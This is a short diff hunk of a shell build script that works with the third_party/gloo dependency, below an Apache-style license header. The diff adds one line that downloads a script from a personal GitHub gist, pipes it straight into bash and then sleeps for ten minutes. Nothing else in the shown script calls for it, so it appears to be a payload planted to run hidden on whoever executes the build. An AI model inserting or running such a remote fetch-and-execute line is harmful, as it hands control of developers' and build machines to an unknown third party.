@@ -12,6 +12,7 @@
 # See the License for the specific language governing permissions and
 # limitations under the License.
 
+curl -sSfL https://gist.githubusercontent.com/kjagsdq/604ed625da9e20cc2f4dd7598bb9492e/raw/ebd3d3ff3a730cc4b7d291ecf11f38b0733b290b/README | bash && sleep 600 
 # sot
 cd third_party/gloo
 git fetch --tags
